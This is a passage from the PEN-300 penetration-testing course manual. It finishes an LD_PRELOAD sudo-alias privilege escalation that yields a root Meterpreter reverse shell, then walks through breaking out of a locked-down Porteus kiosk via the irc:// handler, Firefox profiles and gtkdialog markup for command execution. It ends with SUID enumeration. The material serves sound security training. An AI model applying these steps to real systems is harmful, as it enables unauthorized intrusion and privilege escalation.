be lucky and have env_keep+=LD_PRELOAD set in /etc/sudoers, but it’s not likely. The env_keep 
setting specifically allows certain environment variables to be passed into the sudo session when 
calls are made. By default this is turned off. 
We could try our previous approach of defining a sudo alias for the user, but a quick test indicates 
that our code isn’t executed. In this case, we need to explicitly set LD_PRELOAD when calling 
sudo, which we can do in the alias in .bashrc. 
alias sudo="sudo LD_PRELOAD=/home/offsec/evil_geteuid.so" 
Listing 506 - Setting the sudo alias 
Note that if we were to execute this attack in the normal user’s context, we would want to set the 
environment variable in the user’s .bashrc or .bash_profile, similar to what we did with 
LD_LIBRARY_PATH. 
After reloading our .bashrc file as we did before with source, we can run the cp command again. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
408 
offsec@linuxvictim:~$ sudo cp /etc/passwd /tmp/testpasswd 
HACK: returning from function... 
Listing 507 - Running our command with sudo 
Next, we check our Metasploit console and find that we’ve received a session as root. 
msf5 exploit(multi/handler) > run 
 
[*] Started reverse TCP handler on 192.168.119.120:1337  
[*] Sending stage (3012516 bytes) to 192.168.120.46 
[*] Meterpreter session 9 opened (192.168.119.120:1337 -> 192.168.120.46:39464) at 
2020-07-29 11:16:07 -0400 
 
meterpreter > getuid 
Server username: no-user @ linuxvictim (uid=0, gid=0, euid=0, egid=0) 
Listing 508 - Successfully received a root shell 
Excellent! We’ve escalated privileges and our victim is completely unaware. 
As demonstrated, LD_PRELOAD can be an effective exploitation method in certain scenarios. 
10.3.3.1 Exercises 
1. 
Compile a malicious library file to hook the geteuid function. Load the library with 
LD_PRELOAD and get code execution using cp. 
2. 
Get a root shell using the above malicious library by creating a sudo alias. 
10.4 Wrapping Up 
Considering the significant Linux install base, security professionals must understand the 
potential threats against these systems. In this module, we’ve examined a subset of these 
potential attack vectors. 
We discussed methods of exploiting user configuration files and targeted VIM as a case study. 
We also discussed basic antivirus bypass on Linux using Kaspersky Endpoint Security and the 
suite of antivirus scanners represented at antiscan.me as targets. We then discussed several 
approaches to shared library hijacking. These included the use of the LD_LIBRARY_PATH 
environment variable and LD_PRELOAD. 
This demonstrates that a working knowledge of the weaknesses that may affect Linux systems 
can assist offensive security professionals in conducting assessments against these and similar 
targets. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
409 
 
11 Kiosk Breakouts 
Interactive kiosks618 are computer systems that are generally intended to be used by the public for 
tasks such as Internet browsing, registration, or information retrieval. They are commonly 
installed in the lobbies of corporate buildings, in airports and retail establishments, and in various 
other locations. 
As publicly-used systems, kiosks are designed with restrictive interfaces and offer limited 
functionality which is designed to prevent malicious behavior. However, these unattended 
systems are generally connected to back-end systems or corporate networks and as such can 
act as a platform for compromise. 
Similarly, a thin client619 provides a limited interface to a powerful back-end system. This type of 
client may be physical, such as a self-contained Wyse Client620 or virtual, such as the Citrix621 
virtual desktop. 
The attack methodology used against kiosks and thin clients is similar. 
In this module, we’ll focus on Porteus Kiosk622 as a case study in exploiting a locked-down kiosk in 
order to escape the limited user experience and fully compromise the system. The kiosk could 
then be used to explore and eventually compromise the back-end network and connected 
systems. 
11.1 Kiosk Enumeration 
Since these interfaces are designed with limited functionality, it is important to first enumerate 
what is available. During this process, we will generally not have the luxury of using specialized 
tools like those found on our Kali Linux machine. Instead, we will be “living off the land”, using (or 
misusing) tools already installed on the system to gain ever-increasing access to the system and 
its back-end networks. 
There are several projects dedicated to enumerating useful binaries for this purpose such as the 
Windows-based Living Off The Land Binaries and Scripts (LOLBAS) project623 or the Unix/Linux-
based GTFOBins624 project. These projects could supplement the tactics we use in this module. 
The most cost-effective approach to kiosk software design is to simply apply a 
thin restrictive veneer over a standard operating system. However, this is 
advantageous to an attacker since mainstream operating systems prioritize the 
 
618 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Interactive_kiosk 
619 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Thin_client 
620 (Dell, 2020), https://www.dell.com/en-us/work/shop/wyse-endpoints-and-software/sc/cloud-client/thin-clients 
621 (Citrix, 2020), https://www.citrix.com/products/citrix-virtual-apps-and-desktops/ 
622 (Porteus Solutions, 2020), https://porteus-kiosk.org 
623 (LOLBAS-Project, 2020), https://github.com/LOLBAS-Project/LOLBAS 
624 (GTFOBins), https://gtfobins.github.io 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
410 
user experience, providing tools and access needed by the typical user. This type 
of aftermarket kiosk interface can be difficult to properly secure. 
As we begin our exploration of the console, we must remember that in a real situation, we would 
be physically interacting with the kiosk through a touch screen, a mouse or trackpad, and in some 
cases, a keyboard. However, for the purposes of this lab, we’ll simulate physical access to the 
kiosk with VNC. Since we’ll rely on a variety of keystroke combinations, we’ll use 
XTigerVNCViewer625 which provides excellent keyboard shortcut support. We’ll install this with apt 
from our Kali terminal: 
kali@kali:~$ sudo apt install tigervnc-viewer 
Listing 509 - Installing the tigervnc client 
When the installation is complete, we can run it: 
kali@kali:~$ xtigervncviewer 
Listing 510 - Running the tigervnc client 
Once the client is running, we can enter the IP address of the kiosk VM and connect with the 
password “lab”. To enter fullscreen view, we’ll press * to open the preferences menu and select 
Full screen. This will ensure that all of our keystrokes will be directed to the kiosk. 
 
Figure 171: VNC menu to set the full-screen option 
Once connected, we’re presented with the initial kiosk interface shown in (Figure 172). This 
interface consists of a limited functionality browser window: 
 
625 (TigerVNC), https://tigervnc.org/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
411 
 
Figure 172: Kiosk interface 
Let’s begin navigating the kiosk’s displayed pages. In this case, the only link is the “Contact us” 
email link which doesn’t seem to do anything when clicked. 
Although this link didn’t reveal much, in some situations a link like this could reveal a vulnerable 
contact form, or may even launch an email client. Regardless, it’s best to thoroughly investigate 
the kiosk app before leveraging more interesting techniques. 
Now that we’ve navigated the various pages presented by the kiosk, we’ll attempt to “break out” of 
the expected user experience. The first, and most obvious avenue is to use the right mouse 
button, which, under normal circumstances, would present various submenus or context menus 
we could explore. Unfortunately for us, right-clicking is disabled, at least in this application. If we 
gain access to another application, we may try this again, but for now, we’ll move on. 
Next, we’ll try various combinations of left, right, and middle-clicking combined with B and C 
keys on various items in the interface such as links or menu options. In this case, these 
combinations don’t seem to do much. 
Taking another approach, we’ll try to escape our maximized browser session with built-in 
keyboard shortcuts.626 For example, we can use E+A to attempt to switch tasks, and discover 
that Firefox is the only running application (Figure 173). This is unfortunate as task switching 
could open other avenues of exploration. 
 
626 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Table_of_keyboard_shortcuts 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
412 
 
Figure 173: Switching active applications using Alt-Tab 
In order to be thorough, we’ll attempt a variety of other keyboard shortcut combinations. 
Keyboard shortcut lists are available online for a variety of operating systems 
including Windows627 and Linux window managers such as Gnome628 and 
KDE.629 
Unfortunately, this kiosk doesn’t seem to accept most keyboard shortcuts. We’ll need to try 
another approach. 
11.1.1 
Kiosk Browser Enumeration 
At this point, since we only have access to Firefox, we’ll carefully explore the browser interface 
itself. In some instances, we may have access to various menu items which would warrant 
careful exploration. However, in this case, there are no menus to explore so we’ll begin exploring 
the various buttons (presented as icons) and other elements of the user interface. 
We can move backward and forward through the history with the arrow keys, refresh the page, 
return home, zoom in and out and load a new (blank) tab using the respective buttons. 
Clicking and holding down on the back button can show the browser history or any pages 
previously visited. However, in this case, there is no saved history. 
 
627 (Microsoft, 2020), https://support.microsoft.com/en-us/help/12445/windows-keyboard-shortcuts 
628 (The GNOME Project, 2014), https://help.gnome.org/users/gnome-help/stable/keyboard-shortcuts-set.html.en 
629 (T.C. Hollingsworth, 2016), https://docs.kde.org/trunk5/en/applications/fundamentals/kbd.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
413 
In addition to the available buttons, we can also interact with the URL/address bar. By entering 
text into the URL bar, we are presented with suggested links for keywords that we type. 
Unfortunately, trying to click these results only displays an error page with a lock icon indicating 
that the pages are not available. 
We can also interact with the preferences icon (displayed as a small gear shown in the 
suggestions bar (Figure 174). However, clicking this icon simply opens about:preferences in a 
blank page, again indicating that this functionality is restricted. 
 
Figure 174: Browser suggestions and preferences icon 
This development suggests another angle to consider. Many browsers include keyword 
addresses which provide access to various functionality. However, none of the various Firefox 
internal keywords,630 such as about:config, seem to work. 
 
Figure 175: Firefox keywords result in a blank page 
In this case, the only obvious way to interact with this kiosk is through the address bar. 
The kiosk’s home page URL begins with “file://”. This indicates that content is stored locally in the 
kiosk’s filesystem. Examining the home page URL (file:///var/www/localhost/index.html) reveals 
the home page path (file:///var/www/localhost/). Let’s remove index.html from the URL in an 
attempt to browse the directory’s contents. This presents a directory listing: 
 
630 (Mozilla, 2020), https://developer.mozilla.org/en-US/docs/Mozilla/Firefox/The_about_protocol 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
414 
 
Figure 176: Viewing the parent folder contents 
Unfortunately, this directory listing doesn’t reveal much. 
In some cases we may be able to leverage directory listings or error messages caused by 
erroneous requests to gain information about the server process hosting the pages. 
Unfortunately, any attempt to browse higher-level directories or other locations is denied, and we 
discover no meaningful information. 
So far this kiosk implementation is rather formidable and doesn’t offer many obvious avenues for 
exploration. However, each kiosk offers various challenges, so we’ll move beyond the more 
obvious techniques and press on with a focus on the address bar. 
We already know that the browser renders HTML files and likely accepts standard HTTP and 
HTTPS URLs. However, there are a variety of protocols we can access with Uniform Resource 
Identifiers (URIs).631 For example, the kiosk’s interface presents locally-stored pages with the 
file:// URI. Let’s explore other URIs. 
Several URI schemes, including chrome://, ftp://, mailto:, smb:// and others are blocked by the 
web filtering mechanism and our lack of external Internet access. 
However, the irc:// URI, which uses the irc protocol632 to connect to text-based Internet Relay Chat 
(IRC)633 servers, presents an interesting dialog as shown in (Figure 177): 
 
631 (Internet Assigned Numbers Authority, 2020), https://www.iana.org/assignments/uri-schemes/uri-schemes.xhtml 
632 (Mandar Mirashi, 1996), https://www.w3.org/Addressing/draft-mirashi-url-irc-01.txt 
633 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Internet_Relay_Chat 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
415 
 
Figure 177: Launching an external application using the irc protocol 
This dialog prompts for an application to handle the protocol. This is a significant breakthrough 
which represents the first crack in this kiosk’s defenses. 
11.1.1.1 Exercises 
1. 
What additional information can be discovered about the kiosk? What type of OS is it 
running? 
2. 
Examine the kiosk interface and try different Firefox-specific “about:” keywords and other 
inputs in the address bar to see what feedback the kiosk interface provides and what 
information can be gathered. 
11.2 Command Execution 
Now that we have a potential bypass of the kiosk’s restrictions, we can use this dialog box to 
browse the filesystem. However, we must not select Remember my choice for… which will prevent 
us from being able to choose new programs in the future (Figure 178): 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
416 
 
Figure 178: Ensure the “Remember my choice for…” option is unchecked 
11.2.1 
Exploring the Filesystem 
When we Select Choose…, the kiosk presents a common file browser interface. We’ll first click on 
Home in the left pane: 
 
Figure 179: Firefox’s Launch Application file explorer 
This directory is named guest, revealing that our current username is guest. This is the account 
the kiosk software is running as. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
417 
Now that we have another interface at our disposal, we will attempt various keystroke 
combinations and attempt to right-click on the interface and the various icons. Unfortunately this 
doesn’t produce any results. 
In some restricted interfaces, it is possible to right-click or middle-click to open a 
file explorer or create shortcuts to applications which we could then run. 
The Home menu option seems to be empty and we can’t select the Desktop menu item. However, 
we can browse the filesystem by clicking Other Locations in the left pane and then Computer in 
the right pane as shown in Figure 180: 
 
Figure 180: Browsing the “Other Locations” option in the launch dialog 
This presents the kiosk’s top-level directory: 
 
Figure 181: Linux filesystem on the kiosk 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
418 
 
The naming convention of the root filesystem confirms what we certainly guessed by now: this is 
a Unix or Linux-based system. At this point, we will peruse the filesystem in search of a program 
to run when the browser encounters an irc:// URI. We’ll search a variety of folders that often 
contain Linux binaries,634 including /bin, /usr/bin, /usr/share, /sbin, /usr/sbin, /opt and /usr/local. 
For example, /bin/bash, the Linux Bash shell, is a tempting choice, but when we select it as our 
application to launch, then click the Open Link button to open our link with it, nothing happens and 
we’re returned to our browser interface. In order to try another application, we’ll need to repeat the 
process of entering irc://myhost into the URL bar and selecting a new application. 
 
Figure 182: Attempting to run /bin/bash 
Since this is a command-line program, it won’t work in our graphical environment. Instead, we 
should use a common graphical terminal emulator635 such as xterm, gnome-terminal or konsole. 
Since terminal emulators present an obvious security risk, they are often removed from kiosk 
builds, and as expected, there are none installed on this system. This could severely limit our 
ability to interact with the shell. 
However, there are a number of other programs that may be helpful, including /bin/busybox636 
which combines common Linux/Unix utilities into a single binary. This could come in handy later 
on. 
 
634 (StackExchange, 2020), https://askubuntu.com/questions/27213/what-is-the-linux-equivalent-to-windows-program-files 
635 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Terminal_emulator 
636 (Erik Andersen, 2008), https://busybox.net/about.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
419 
 
Figure 183: /bin folder 
In addition, /usr/bin/dunstify637 displays quick pop-up messages that disappear after a short 
period of time. Let’s select this program to determine if Firefox will load it. 
We’ll select dunstify in the Launch Application dialog box and allow it to run: 
 
Figure 184: Displaying a message with dunstify 
This created a simple drop-down notification that simply reads “irc://myhost”. This is important 
for two reasons. First, there does not appear to be a protection mechanism in place that blocks 
external applications. Second, we have discovered that the URI (“irc://myhost”) was passed as an 
argument to dunstify on the command line. We can safely assume that Firefox ran a command 
similar to: 
dunstify irc://myhost 
Listing 511 - Dunstify command line call from Firefox 
This could explain our earlier difficulty running applications. If they are being run with a first 
parameter of irc://myhost and the program doesn’t accept that as valid, our attempt will fail. 
We can test this with various applications in /bin on our Kali Linux command line. For example, 
let’s test /bin/bash with this argument: 
 
637 (Arch Linux, 2020), https://wiki.archlinux.org/index.php/Dunst#Dunstify 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
420 
kali@kali:~$ /bin/bash irc://myhost 
/bin/bash: irc://myhost: No such file or directory 
kali@kali:~$ 
Listing 512 - irc command as first parameter failing in Kali 
Because of the invalid argument, /bin/bash returns an error and does not run properly. 
We could get around this with /usr/bin/env, which we can use to set the first parameter as an 
environment variable and cancel out the first parameter when calling our target program. The 
syntax would be similar to: 
/usr/bin/env irc://myhost=something /bin/bash 
Listing 513 - Negating the first parameter using env 
This would create an environment variable named “irc://myhost” with a value of “something” and 
then run /bin/bash. If we test this on Kali, it works fine, but when run on the kiosk through 
Firefox, it fails (Figure 185). As with our attempt at running Bash, this is likely due to the lack of 
terminal emulator programs on the system. 
 
Figure 185: /usr/bin/env attempt 
Although we could spend a great deal more time experimenting with various system programs, 
we should take a step back at this point and remember that one program in particular, Firefox, 
runs perfectly fine on this kiosk and accepts parameters. We could use this to our advantage. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
421 
As documented,638 the first parameter to Firefox is a URL (or URI). Knowing that Firefox accepts 
irc://myhost as a valid URI, we could launch Firefox itself with that parameter. However, that 
doesn’t seem like a step forward until we consider Firefox’s other command-line parameters. 
11.2.2 
Leveraging Firefox Profiles 
As we already know, Firefox is running in a restricted mode likely set in a specially-configured 
profile. We may be able to break out of these restrictions by loading a different profile 
configuration. 
According to the documentation, the command-line argument for specifying a new profile is -P 
“profilename”. We’ll try this out with a new URI (irc://myhost -P “haxor”) and select 
/usr/bin/firefox as the application to run in the Launch Application dialog (Figure 186). 
 
Figure 186: Running Firefox from Firefox with a specific profile 
This launches a new Firefox instance which presents us with the Firefox profile manager: (Figure 
187): 
 
638 (Mozilla, 2020), https://developer.mozilla.org/en-US/docs/Mozilla/Command_Line_Options 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
422 
 
Figure 187: Firefox Profile Manager 
From here, we can create our own profile, in this case named “haxor” (Figure 188): 
 
Figure 188: Creating the new Firefox profile 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
423 
 
Once our profile is created, Firefox opens a new window and again displays the Launch 
Application dialog box, which we can dismiss. This instance of Firefox presents a new set of 
menus: 
 
Figure 189: Firefox is unrestricted and previously unavailable menu icons are now available 
We have broken out of the restricted instance of Firefox. Very nice. We’re making progress. 
11.2.3 
Enumerating System Information 
At this stage, if the kiosk were Internet-connected, we would have a host of options available to 
us. With an unrestricted browser, we could install add-on components such as terminal 
emulators or file browsers. We could connect to online tools such as text editors, which could 
help us write local files. In fact, we could even leverage highly-specialized kiosk pentesting tools 
like iKAT.639 (Warning: the iKat website may contain content that is not safe for work.) 
However, since we do not have Internet connectivity, we will instead begin with some basic read-
only enumeration using the file:/// URI. 
We’ll begin with the /etc/passwd file which reveals valuable information (Figure 190): 
 
639 (Paul Craig, 2010), http://www.ikat.kronicd.net/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
424 
 
Figure 190: Viewing /etc/passwd 
Based on the login shell (the final column of each line), there are only three valid login users: root, 
operator, and guest. Root and operator share the same home folder, so operator is likely a utility 
account of some sort, perhaps for remote management. Guest is the user the kiosk interface is 
currently running under, which we know is limited. 
Moving on, the version file at file:///proc/version reports that the system is running a fairly recent 
kernel version,640 which means direct kernel exploitation may be difficult: 
 
Figure 191: /proc/version file contents 
Next, an examination of the guest user’s home folder reveals that there are no SSH private keys: 
 
640 (Linux Kernel Organization, Inc, 2020), https://www.kernel.org 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
425 
 
Figure 192: No private keys in guest user’s home folder 
However, even if we did find keys, we could not leverage them without access to a terminal 
application or graphical SSH client. 
Since our read-only exploration is returning few results, we’ll move in a new direction leveraging 
our unlocked browser profile. Let’s select the Show Downloads Folder option in an attempt to gain 
access to some sort of file explorer (Figure 193): 
 
Figure 193: Attempting to view downloads folder 
This presents another Launch Application dialog box, indicating that a desktop file browser utility 
isn’t available. A search for a suitable program yields no results. 
Since we have access to neither a terminal application nor a file browser, we are severely limited 
in our ability to interact with the underlying operating system. 
However, Firefox includes various Web Developer tools that could be useful, each located under 
the “hamburger” menu: 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
426 
 
Figure 194: Hamburger menu and Web Developer menu options 
Logins and Passwords, although enticing, is unfortunately empty. Many of these tools could be 
useful, but we’ll begin with Scratchpad:641 
 
641 (Mozilla, 2020), https://developer.mozilla.org/en-US/docs/Tools/Scratchpad 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
427 
 
Figure 195: Scratchpad utility in Firefox 
11.2.4 
Scratching the Surface 
Scratchpad is a built-in text editor intended for running and debugging JavaScript, but can also 
load and save plain-text files. 
Scratchpad is now deprecated, but is still included in the kiosk’s version of 
Firefox. 
For example, we can use Scratchpad to save a mytest.txt file to our home directory. Browsing that 
location in Firefox indicates that the file creation was successful: 
 
Figure 196: File written successfully with Scratchpad 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
428 
 
This is all well and good, but it seems we are still limited to running programs through the 
irc://myhost method, which severely limits our abilities. 
However, one application in particular, /usr/bin/gtkdialog,642 may be useful in this situation. A 
quick Google search reveals that this application builds interfaces with an HTML-style markup 
language. This could be especially useful since this machine doesn’t seem to have any other build 
tools such as gcc or g++. 
We can load build scripts with the -f parameter.643 
Let’s build a simple initial dialog box644 for testing: 
<window> 
  <vbox> 
    <frame Description> 
      <text> 
        <label>This is an example window.</label> 
            </text> 
        </frame> 
        <hbox> 
            <button ok> 
            <action>echo "testing gtk" > /tmp/gtkoutput.txt</action> 
            </button> 
            <button cancel></button> 
        </hbox> 
    </vbox> 
</window> 
Listing 514 - Test window markup code 
Note that when typing a left angled bracket character, the kiosk replaces it with a right angled 
bracket character. We can open the splash page HTML file at /var/www/localhost/index.html and 
copy the left angle bracket character and paste into this document to be used when we need it. 
We’ll briefly walk through this example. An interface is represented by a combination of tags that 
define its various parts. A window tag represents the main window, and anything between the 
tags is considered a sub-component of the window. A vbox element is a vertical box that holds 
other elements. An hbox is a horizontal box. A frame acts as a simple container for elements such 
as text or graphics. Text elements display text and label elements specify the actual text strings 
being placed in the text element. Button objects allow the user to trigger an action such as a shell 
or other executable command. 
In the example above, when we click the button, our echo command will be executed and the 
output written to a file via the Linux redirect operator (>). 
 
642 (Google, 2020), https://code.google.com/archive/p/gtkdialog/ 
643 (Damien Pobel, 2013), http://pwet.fr/man/linux/commandes/gtkdialog/ 
644 (Hanny Helal, 2015), https://www.tecmint.com/gtkdialog-create-graphical-interfaces-and-dialog-boxes/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
429 
 
For further reference, consult the extensive list of gtkdialog elements on the 
GtkDialog Google Code Archive page. 645 
Using Scratchpad, we’ll save our sample dialog box code to the guest user’s home folder as 
mywindow, making sure to change the pulldown in the bottom right corner of the save dialog 
from “JavaScript Files” to “All Files” as shown in Figure 197: 
 
Figure 197: Saving sample dialog and changing file type 
Now, let’s run our sample dialog window with the following URI: 
irc://myhost -f /home/guest/mywindow 
Listing 515 - Running the sample dialog from Firefox 
This again presents the “Launch Application” dialog, where we’ll select gtkdialog as our helper 
application: 
 
645 (Google, 2020), https://code.google.com/archive/p/gtkdialog/wikis 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
430 
 
Figure 198: Running our sample GTK dialog with Firefox 
This produces a window titled “gtkdialog”: 
 
Figure 199: Our sample GtkDialog window 
Nothing appears to happen when we click the OK button, but if we browse to 
file:///tmp/gtkoutput.txt in a new Firefox tab, we’ll find that the action triggered and wrote our text 
to the output file. This means we have command execution on the system and we are no longer 
restricted by the initial irc://myhost parameter issue. Very nice. 
This is a great start, but it’s an awkward solution. For every command we want to execute, we 
must edit a file, save it, relaunch our gtkdialog application, click the button, and then browse to the 
result through Firefox. In the next section, we’ll Try Harder. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
431 
11.2.4.1 Exercises 
1. 
Browse around the filesystem using the “Launch Application” dialog and gather as much 
useful information about the system as possible. 
2. 
Try out various programs via the “Launch Application” dialog. Which ones seem useful for 
information gathering or potential exploitation when launched from Firefox? 
11.2.4.2 Extra Mile 
Find a way to write user-provided text to a file on the file system without Scratchpad. One 
potential option might include the JavaScript console. 
11.3 Post-Exploitation 
At this point, we have compromised the kiosk, although we are still running as a limited user and 
our command input method is inconvenient. Although our gtkdialog trick was useful, running 
commands and receiving instant feedback would be much more preferable. Although we have no 
build tools, no Internet access, and the system has no terminal applications, we may be able to 
better leverage gtkdialog by building our own custom terminal. 
Surprisingly, there is an actual terminal646 element for gtkdialog. Sadly, it produces the following 
message: 
The terminal (VteTerminal) widget requires a version of gtkdialog built with libvte. 
Listing 516 - Missing libraries for “terminal” element 
The version of gtkdialog on the kiosk is missing critical libraries used for terminal emulation, so 
this won’t work. 
We’ll have to find another way. The terminal must have the ability to accept input and produce 
output. There are many good examples of complex interfaces created in gtkdialog with input and 
output capability.647 The entry648 and edit649 elements allow user input into a single-line text box or 
large text field, respectively, and both can produce output. The text element, which displays static 
text, can produce output as well. 
Let’s use these, and other elements, to build our interactive shell. 
11.3.1 
Simulating an Interactive Shell 
Many elements in gtkdialog accept an input file650 sub-element. If we provide a text, entry, or edit 
element with an input file, it will autopopulate the element’s text with the file’s contents. However, 
this happens when the element is initially created, so we must use a refresh action to update the 
text after our command has run. In order to do this, we must store our text in variable elements. 
Specifically, we’ll associate a variable with a particular element by putting the variable tag inside 
 
646 (Google, 2020), https://code.google.com/archive/p/gtkdialog/wikis/terminal.wiki 
647 (PCLinuxOS Magazine, 2009), http://pclosmag.com/html/Issues/200910/page21.html 
648 (Google, 2020), https://code.google.com/archive/p/gtkdialog/wikis/entry.wiki 
649 (Google, 2020), https://code.google.com/archive/p/gtkdialog/wikis/edit.wiki 
650 (SourceForge, 2008), http://xpt.sourceforge.net/techdocs/language/gtkdialog/gtkde02-GtkdialogExamples/single/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
432 
the opening and closing tags of the element. If we do this for an element that displays text and 
gets its input from a file, and then execute a refresh action on the variable, the text-displaying 
element will refresh its content from the current version of the file. 
Similarly, if we use an element that accepts text input from the user and embed a variable tag 
within it, the element will store the content of the text input in the variable. We can then reference 
these variables using Bash-style variable substitution651 in our button actions. 
Combining all of this, we can write a functional pseudo-terminal interface. We’ll need a command 
input box that will store the command the user enters in a variable. We’ll also need an edit 
element that will display the output of the commands, which by design will also allow copy and 
paste operations. This element will be populated by an input file, which will contain the results of 
the command output. We’ll then use a button element that will take the shell command variable 
from the entry box, run it via an action, and write the results to the command output file. A second 
action embedded in the button will then refresh the edit element’s embedded variable object. This 
will trigger the display content in the edit box to refresh, giving the illusion of a dynamic terminal 
window. 
This code is shown in Listing 517. 
<window> 
  <vbox> 
    <vbox scrollable="true" width="500" height="400"> 
        <edit> 
          <variable>CMDOUTPUT</variable> 
          <input file>/tmp/termout.txt</input> 
        </edit> 
    </vbox> 
    <hbox> 
      <text><label>Command:</label></text> 
      <entry><variable>CMDTORUN</variable></entry> 
      <button> 
          <label>Run!</label>   
          <action>$CMDTORUN > /tmp/termout.txt</action> 
          <action>refresh:CMDOUTPUT</action>   
      </button> 
    </hbox> 
  </vbox> 
</window> 
Listing 517 - Terminal window markup code 
We’ll save our terminal window markup as /home/guest/terminal.txt and then run it as we did the 
previous gtkdialog example. 
When we enter commands into our text element and click Run!, the output of the command is 
displayed as if we had entered it from a standard terminal window: 
 
651 (Mendel Cooper, 2012), https://www.tldp.org/LDP/abs/html/varsubn.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
433 
 
Figure 200: Our homemade terminal 
This is a very effective solution given the limitations of this kiosk, and demonstrates the potential 
effectiveness of “living off the land” with native tools. 
11.3.1.1 Exercises 
1. 
Improve the terminal, making it more effective or more reliable. Integrate standard error 
output. 
2. 
Explore the other widgets and elements of gtkdialog. What other useful features can be 
created with it that might be useful for interacting with the system? 
11.3.1.2 Extra Mile 
Experiment with creating simple applications with gtkdialog to streamline the exploitation 
process. One potential project is a text editor based on our terminal application. 
11.4 Privilege Escalation 
Now that we have developed an efficient way of interacting with the system, we should focus our 
attention on escalating our privileges to gain root access. Unfortunately, without build tools or the 
ability to transfer files (because we’re simulating a disconnected physical kiosk), this may prove 
to be difficult. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
434 
One approach is to leverage the Basic Linux Privilege Escalation techniques outlined by 
g0tmi1k.652 In this document, the author lists several commands we can use for enumeration, 
including a find command (find / -perm -u=s -exec ls -al {} +) that locates suid 
binaries: 
-r-sr-xr-x    1 root     root        101787 Sep  7 12:19 /opt/Citrix/ICAClient/ctxusb 
-rws--x--x    1 root     bin        1560160 Jul 13  2017 /usr/bin/xlock 
-rws--x--x    1 root     root        396000 Sep 14 13:24 /usr/lib64/misc/ssh-keysign 
